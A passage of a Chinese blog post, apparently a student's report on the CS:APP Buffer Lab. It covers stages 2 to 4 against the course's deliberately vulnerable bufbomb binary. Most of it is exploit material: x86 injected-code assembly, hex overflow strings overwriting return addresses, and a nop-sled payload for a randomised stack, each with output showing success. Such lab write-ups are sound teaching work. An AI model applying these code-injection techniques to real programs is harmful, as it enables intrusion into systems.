<p>然后我们依次使用<code>gcc -m32 -c level2-exploit.s</code>和<code>objdump -d level2-exploit.o &gt; level2-exploit.d</code>将攻击代码汇编和反汇编，具体的命令和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; gcc -m32 -c level2-exploit.s                          </span><br><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; objdump -d level2-exploit.o &gt; level2-exploit.d</span><br><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level2-exploit.d                                    </span><br><span class="line"></span><br><span class="line">level2-exploit.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:	b8 4c 92 de 3d       	mov    <span class="variable">$0x3dde924c</span>,%eax</span><br><span class="line">   5:	a3 00 d1 04 08       	mov    %eax,0x804d100</span><br><span class="line">   a:	83 c4 10             	add    <span class="variable">$0x10</span>,%esp</span><br><span class="line">   d:	c3                   	ret     </span><br></pre></td></tr></table></figure>　</p>
<p>最后我们根据以上的信息来生成我们最终的攻击代码，如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</span><br><span class="line">00 00 00 00 58 2f 68 55 /* 保存的%ebp以及返回地址(在栈上) */</span><br><span class="line">b8 4c 92 de 3d a3 00 d1</span><br><span class="line">04 08 83 c4 10 c3 00 00 /* 攻击代码 */</span><br><span class="line">9d 8c 04 08　           /* 返回地址指向函数bang */</span><br></pre></td></tr></table></figure></p>
<p>下面我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level2.txt|./hex2raw|./bufbomb -u BlackDragon</span><br><span class="line">Userid: BlackDragon</span><br><span class="line">Cookie: 0x3dde924c</span><br><span class="line">Type string:Bang!: You <span class="built_in">set</span> global_value to 0x3dde924c</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure></p>
<p>阶段2完成。</p>
<h3 id="阶段3：炸药（Dynamite）"><a href="#阶段3：炸药（Dynamite）" class="headerlink" title="阶段3：炸药（Dynamite）"></a>阶段3：炸药（Dynamite）</h3><p>在前面的几个阶段中，我们所有的攻击都导致程序跳转至其他函数并退出。所以，使用会破坏栈的攻击代码是可行的。</p>
<p>在该阶段中，你需要修改程序的寄存器和内存状态，并且使程序能正确的返回值原调用者函数并且不出错。这就意味着你必须：</p>
<ol>
<li>在栈上执行机器代码</li>
<li>将返回指针置于代码的起始</li>
<li>修复对栈造成的破坏</li>
</ol>
<p>具体来说，你需要让函数getbuf返回cookie而不是1至函数test。注意到在test中当返回值为cookie时程序会输出”Boom!”。你的攻击代码应当将cookie设置为返回值，恢复任何被破坏的状态，将正确的返回地址push到栈上，最终执行ret指令。</p>
<p>对于该阶段，我们的思路如下：</p>
<ol>
<li>缓冲区溢出的部分要保证保存的%ebp不变以方便后续的寻址过程（攻击代码中使用）。然后和阶段2一样，通过溢出使程序跳转至栈上执行相应的攻击代码</li>
<li>攻击代码首先将返回地址设置为正确的返回地址（调用者的下一条指令）</li>
<li>然后再将返回值（%eax）设置为cookie</li>
<li>最终修改栈顶（%esp）并ret</li>
</ol>
<p>缓冲区溢出攻击后，我们期望的整个程序的执行过程如下：</p>
<ol>
<li>跳转至栈上执行代码，此时%esp被修改至第48个字节处，且%ebp中存有正确的值。</li>
<li>程序执行攻击代码，该攻击代码重置了返回地址，覆盖了getbuf的返回值，修改了栈顶指针并ret</li>
<li>程序带着完整的栈状态和修改后的返回值返回至test函数，并继续执行</li>
</ol>
<p>下面我们讨论一下攻击代码中具体的细节。</p>
<p>首先是保存的ebp的值到底是多少，这个我们可以在gdb中直接调试打印得出，为0x55682f80。<br>栈上的返回地址和阶段2一样，为0x55682f58。</p>
<p>然后我们的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x8048dbe, %eax <span class="comment">;将真正的返回地址送入%eax</span></span><br><span class="line"><span class="keyword">mov</span> %eax, -<span class="number">0x2c</span>(%ebp) <span class="comment">;将%eax送入栈上的正确位置</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax <span class="comment">;修改返回值</span></span><br><span class="line"><span class="keyword">sub</span> <span class="number">$4</span>, %esp <span class="comment">;修改栈顶%esp</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure></p>
<p>这里讨论一下为什么是-0x2c(%ebp)，保存的%ebp是调用者的栈底，我们观察调用者函数test的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">08048<span class="keyword">daa</span> &lt;<span class="keyword">test</span>&gt;:</span><br><span class="line"> 8048<span class="keyword">daa</span>:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</span><br><span class="line"> 8048dab:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</span><br><span class="line"> 8048dad:       <span class="number">53</span>                      <span class="keyword">push</span>   %ebx</span><br><span class="line"> 8048dae:       <span class="number">83</span> ec <span class="number">24</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x24,%esp</span><br><span class="line"> 8048db1:       e8 da ff ff ff          <span class="keyword">call</span>   8048d90 &lt;uniqueval&gt;</span><br><span class="line"> 8048db6:       <span class="number">89</span> <span class="number">45</span> f4                <span class="keyword">mov</span>    %eax,-<span class="number">0xc</span>(%ebp)</span><br><span class="line"> 8048db9:       e8 <span class="number">36</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   80491f4 &lt;getbuf&gt;</span><br><span class="line"> 8048dbe:       <span class="number">89</span> c3                   <span class="keyword">mov</span>    %eax,%ebx</span><br><span class="line"> 8048dc0:       e8 cb ff ff ff          <span class="keyword">call</span>   8048d90 &lt;uniqueval&gt;</span><br><span class="line"> 8048dc5:       8b <span class="number">55</span> f4                <span class="keyword">mov</span>    -<span class="number">0xc</span>(%ebp),%edx</span><br><span class="line"> 8048dc8:       <span class="number">39</span> d0                   <span class="keyword">cmp</span>    %edx,%eax</span><br><span class="line"> 8048dca:       <span class="number">74</span> 0e                   <span class="keyword">je</span>     8048dda &lt;<span class="keyword">test</span>+<span class="number">0x30</span>&gt;</span><br><span class="line"> 8048dcc:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">88</span> a3 <span class="number">04</span> <span class="number">08</span>    movl   <span class="number">$0</span>x804a388,(%esp)</span><br><span class="line"> 8048dd3:       e8 e8 fa ff ff          <span class="keyword">call</span>   80488c0 &lt;puts@plt&gt;</span><br><span class="line"> 8048dd8:       eb <span class="number">46</span>                   <span class="keyword">jmp</span>    8048e20 &lt;<span class="keyword">test</span>+<span class="number">0x76</span>&gt;</span><br><span class="line"> 8048dda:       3b <span class="number">1d</span> <span class="number">08</span> d1 <span class="number">04</span> <span class="number">08</span>       <span class="keyword">cmp</span>    <span class="number">0x804d108</span>,%ebx</span><br><span class="line"> 8048de0:       <span class="number">75</span> <span class="number">26</span>                   <span class="keyword">jne</span>    8048e08 &lt;<span class="keyword">test</span>+<span class="number">0x5e</span>&gt;</span><br><span class="line"> 8048de2:       <span class="number">89</span> 5c <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %ebx,<span class="number">0x8</span>(%esp)</span><br><span class="line"> 8048de6:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> 2a a5 <span class="number">04</span>    movl   <span class="number">$0</span>x804a52a,<span class="number">0x4</span>(%esp)</span><br><span class="line"> 8048ded:       <span class="number">08</span></span><br><span class="line"> 8048dee:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</span><br><span class="line"> 8048df5:       e8 c6 fb ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048dfa:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x3,(%esp)</span><br><span class="line"> 8048e01:       e8 <span class="number">75</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   804937b &lt;validate&gt;</span><br><span class="line"> 8048e06:       eb <span class="number">18</span>                   <span class="keyword">jmp</span>    8048e20 &lt;<span class="keyword">test</span>+<span class="number">0x76</span>&gt;</span><br><span class="line"> 8048e08:       <span class="number">89</span> 5c <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %ebx,<span class="number">0x8</span>(%esp)</span><br><span class="line"> 8048e0c:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> <span class="number">47</span> a5 <span class="number">04</span>    movl   <span class="number">$0</span>x804a547,<span class="number">0x4</span>(%esp)</span><br><span class="line"> 8048e13:       <span class="number">08</span></span><br><span class="line"> 8048e14:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</span><br><span class="line"> 8048e1b:       e8 a0 fb ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048e20:       <span class="number">83</span> c4 <span class="number">24</span>                <span class="keyword">add</span>    <span class="number">$0</span>x24,%esp</span><br><span class="line"> 8048e23:       5b                      <span class="keyword">pop</span>    %ebx</span><br><span class="line"> 8048e24:       <span class="number">5d</span>                      <span class="keyword">pop</span>    %ebp</span><br><span class="line"> 8048e25:       c3                      <span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure></p>
<p>我们可以知道函数test在栈上分配了0x24=36个字节的空间，而在这之前栈上还有被push的%ebx占4个字节，那么如果要想要定位到调用者栈顶的返回地址，偏移量应为36+4+4=44=0x2c，考虑到栈自高地址向低地址增长，所以应为-0x2c(%ebp)。</p>
<p>而程序从getbuf返回时栈顶指针并没有指向我们设置的返回地址，而是指向了栈上紧邻着该地址的高地址位置，所以我们需要将%esp-4以确保其指向了我们设置的返回地址，使得程序能正确返回。</p>
<p>下面我们使用gcc和objdump生成攻击代码，并且我们最终的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</span><br><span class="line">80 2f 68 55 58 2f 68 55 /* 保存的%ebp和返回地址（位于栈上） */</span><br><span class="line">b8 be 8d 04 08 89 45 d4 /* 攻击代码 */</span><br><span class="line">b8 4c 92 de 3d 83 ec 04</span><br><span class="line">c3</span><br></pre></td></tr></table></figure></p>
<p>最后我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level3.txt|./hex2raw|./bufbomb -u BlackDragon         </span><br><span class="line">Userid: BlackDragon</span><br><span class="line">Cookie: 0x3dde924c</span><br><span class="line">Type string:Boom!: getbuf returned 0x3dde924c</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure></p>
<p>阶段3完成。</p>
<h4 id="攻击代码的优化"><a href="#攻击代码的优化" class="headerlink" title="攻击代码的优化"></a>攻击代码的优化</h4><p>注意到在上面我们的攻击代码还是很麻烦的，我们不仅花了很大的时间保证被保存的%ebp不变，还调整了栈顶指针使得函数能正确返回。</p>
<p>其实，我们可以使用push returnAddress，ret来达到返回到指定位置的效果。也能直接在攻击代码中设置%ebp的值，这样，我们的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c,%eax <span class="comment">;返回值</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x55682f80,%ebp <span class="comment">;修改%ebp</span></span><br><span class="line"><span class="keyword">push</span> <span class="number">$0</span>x8048dbe <span class="comment">;将返回地址压栈</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure></p>
<p>根据以上的信息重新生成我们的攻击代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</span><br><span class="line">00 00 00 00 58 2f 68 55 /* 保存的%ebp和返回地址（位于栈上）*/</span><br><span class="line">b8 4c 92 de 3d bd 80 2f /* 攻击代码 */</span><br><span class="line">68 55 68 be 8d 04 08 c3</span><br></pre></td></tr></table></figure></p>
<p>使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level3-2.txt|./hex2raw|./bufbomb -u BlackDragon          </span><br><span class="line">Userid: BlackDragon</span><br><span class="line">Cookie: 0x3dde924c</span><br><span class="line">Type string:Boom!: getbuf returned 0x3dde924c</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure></p>
<h3 id="阶段4：硝化甘油（Nitroglycerin）"><a href="#阶段4：硝化甘油（Nitroglycerin）" class="headerlink" title="阶段4：硝化甘油（Nitroglycerin）"></a>阶段4：硝化甘油（Nitroglycerin）</h3><blockquote>
<p>需要为bufbomb以及hex2raw添加命令行参数’-n’以执行本阶段</p>
</blockquote>
<p>本阶段非常的具有挑战性，在本阶段中，函数getbuf的栈帧的位置在每次运行时都是不同的。栈随机化的策略明显提升了攻击的难度。</p>
<p>具体来说，在该阶段中，程序会调用getbufn来从标准输入流中读取数据，和getbuf不同的是，getbufn具有512个字节的缓冲区，并且，在相邻两次getbufn的调用中，%ebp的值将会出现最多+-240的误差。除此以外，在该阶段中，程序总共会使用5次你所输入的字符串，也就是说，总共会调用5次getbufn。同阶段3的任务相似，你必须保证每一次调用getbufn，其返回值均为cookie。</p>
<p>若返回值为cookie，则程序会输出”KABOOM!”。你的攻击代码需要在5次栈帧位置不同的函数getbuf的调用中设置cookie为返回值，恢复对栈造成的破坏，设置正确的返回地址，并最终执行ret执行以返回testn。</p>
<p>在本阶段中我们需要使用一种名为nop雪橇（nop sled）的攻击方式来对抗随机化。具体来说，就是通过在攻击代码前大量插入nop（空操作，编码为90）。这样，就算栈的起始地址在一定范围内波动，只要程序能跳转至其中一个nop指令，就能顺着这一组nop指令滑向我们真正的攻击代码。</p>
<p>首先我们需要考虑的是我们攻击代码的长度，由于必须要通过缓冲区溢出覆盖掉函数getbufn的返回地址，所以攻击代码的长度至少为520个字节的缓冲区，4个字节的被保存的%ebp，以及4个字节的返回地址。</p>
<p>我们将攻击代码放在缓冲区的最后，并且用90（nop）填充所有未被利用到的缓冲区以实现一个nop sled。</p>
<p>具体的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lea</span> <span class="number">0x28</span>(%esp), %ebp <span class="comment">;复原%ebp</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax <span class="comment">;设置cookie</span></span><br><span class="line"><span class="keyword">push</span> <span class="number">$0</span>x8048e3a <span class="comment">;将返回地址压栈</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure></p>
<p>注意到我们无法再采用阶段3中的办法来复原%ebp了。但是注意到，当函数从getbufn返回时，%esp的值是正确的，而%esp和%ebp的相对差值是固定的，因此我们可以根据函数返回时的%esp去还原%ebp，对于testn来说，%esp和%ebp之间相差了36+4=40=0x28个字节。</p>
<p>最后是返回地址的设定，在gdb中观察可知第一次执行时buf的地址为0x55682f40，因此我们将返回地址设置为0x55682f40-480=0x55682d60可保证每次都能命中。</p>
<p>最终我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* nop sled */</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 8d 6c 24</span><br><span class="line">28 b8 4c 92 de 3d 68 3a 8e 04 08 c3 60 2d 68 55 /* 攻击代码与返回地址 */</span><br></pre></td></tr></table></figure></p>
<p>使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level4.txt|./hex2raw -n|./bufbomb -u BlackDragon -n  </span><br><span class="line">Userid: BlackDragon</span><br><span class="line">Cookie: 0x3dde924c</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure></p>
<p>阶段4完成。</p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>Buffer Lab整体上同Attack Lab的第1部分，代码注入攻击相似，不同在于需要了解IA32的栈帧结构，过程调用以及参数传递的原理。</p>
<p>除此以外，还需要了解对抗栈随机化的一种攻击方式 - nop sled。</p>

            

        </div>
    </div>
    <div id="post-footer" class="post-footer main-content-wrap">
        
            <div class="post-footer-tags">
                <span class="text-color-light text-small">标签</span><br/>
                
    <a class="tag tag--primary tag--small t-link" href="/tags/实验/">实验</a> <a class="tag tag--primary tag--small t-link" href="/tags/计算机系统/">计算机系统</a>

            </div>
        
        
            <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/07/06/Arch下Hexo配置的问题总结/" data-tooltip="Arch下Hexo配置的问题总结" aria-label="上一篇: Arch下Hexo配置的问题总结">
                
                    <i class="fa fa-angle-left" aria-hidden="true"></i>
                    <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
                </a>
            </li>
            <li class="post-action">
                
                    
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/05/12/迁移说明/" data-tooltip="迁移说明" aria-label="下一篇: 迁移说明">
                
                    <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
                    <i class="fa fa-angle-right" aria-hidden="true"></i>
                </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Diesen Beitrag teilen">
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/" title="分享到 Facebook">
                    <i class="fa fa-facebook-official" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/" title="分享到 Twitter">
                    <i class="fa fa-twitter" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/" title="分享到 Weibo">
                    <i class="fa fa-weibo" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/&amp;title=深入理解计算机系统BufferLab实验报告" title="分享到 QQ">
                    <i class="fa fa-qq" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/" title="分享到 Qzone">
                    <i class="fa fa-star" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


        
        
            
        
    </div>
</article>



                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2018 码龙黑曜. All Rights Reserved.
    </span>
</footer>

            </div>
            
                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
                    <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/07/06/Arch下Hexo配置的问题总结/" data-tooltip="Arch下Hexo配置的问题总结" aria-label="上一篇: Arch下Hexo配置的问题总结">
                
                    <i class="fa fa-angle-left" aria-hidden="true"></i>
                    <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
                </a>
            </li>
            <li class="post-action">
                
                    
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/05/12/迁移说明/" data-tooltip="迁移说明" aria-label="下一篇: 迁移说明">
                
                    <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
                    <i class="fa fa-angle-right" aria-hidden="true"></i>
                </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Diesen Beitrag teilen">
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/" title="分享到 Facebook">
                    <i class="fa fa-facebook-official" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/" title="分享到 Twitter">
                    <i class="fa fa-twitter" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/" title="分享到 Weibo">
